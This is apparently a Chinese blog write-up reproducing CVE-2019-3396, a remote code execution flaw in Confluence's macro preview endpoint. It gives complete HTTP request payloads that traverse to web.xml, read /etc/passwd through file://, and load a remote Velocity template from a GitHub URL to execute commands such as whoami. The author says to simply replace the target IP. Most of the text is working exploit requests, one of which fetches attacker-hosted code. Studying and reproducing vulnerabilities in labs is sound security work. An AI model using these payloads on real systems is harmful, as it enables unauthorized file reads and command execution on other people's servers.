# CVE-2019-3396 Confluence RCE漏洞复现

## 漏洞利用

### 读取外部web.xml
利用Bp进行抓包，注意Referer字段最好用自己抓的包的值，vulhub上提供的payload如下
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: Your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://Your-ip:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
```

### 利用file协议读取本地任意文件
6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用file:///etc/passwd来读取文件，也可以通过https://...来加载远程文件。该文件是一个Velocity模板，我们可以通过模板注入（SSTI）来执行任意命令：
payload：
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 192.168.124.153:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://192.168.124.153:8090/pages/resumedraft.action?draftId=65594&draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad
Content-Type: application/json; charset=utf-8
Content-Length: 167
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
```

### 实现RCE excute command
主要原理是根据读文件的思路，远程包含python搭建的ftp服务器上的.vm文件来创造执行命令的环境，进而实现RCE。
照着搭建ftp等方式去进行复现我竟然没有成功，ftp服务这些是没有问题的，测试过了，很是苦恼，但突然发现goby上面有该漏洞的poc，能够检测该漏洞，而且对于该漏洞还有验证功能，更厉害的是还有一个链接，该链接也就是那个vm文件，所以就不用再搭建http或者ftp环境了，直接把_template的值改成这个链接的即可。链接如下。
`https://raw.githubusercontent.com/r33nd/confluence/master/cmd.vm`
完整POC如下
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: IP:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://IP:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 244


{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/r33nd/confluence/master/cmd.vm","cmd":"whoami"}}}
```
只需要改poc里面的IP地址（改为自己的目标IP），然后执行命令，poc中执行的是whoami命令。

PS：这个方法很简单，复制poc，把ip一换就好了，省略了搭建环境的步骤；但是如果从学习的角度出发建议小伙伴还是照着网上那种完整步骤去进行复现。如果是要追求速度的话，那么用这个方法还是会快一些的。